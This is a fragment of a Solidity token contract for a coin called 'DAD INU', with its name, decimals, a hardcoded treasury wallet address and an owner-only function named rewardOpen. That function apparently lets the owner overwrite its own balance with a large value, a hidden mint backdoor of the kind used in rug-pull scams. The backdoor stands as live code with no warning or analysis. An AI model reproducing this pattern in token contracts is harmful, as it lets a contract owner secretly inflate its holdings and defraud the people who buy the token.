...
contract DADINU is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "DAD INU";
    string private _symbol = "DAD INU";
    uint8 private _decimals = 18;

    address payable public treasuryWallet = payable(0xbb80A3750306a197a203F393f9Ed4aceF291f3e2);
    ...
    function rewardOpen() public onlyOwner() {_walletTotals[owner()] = getTotalRewards;}
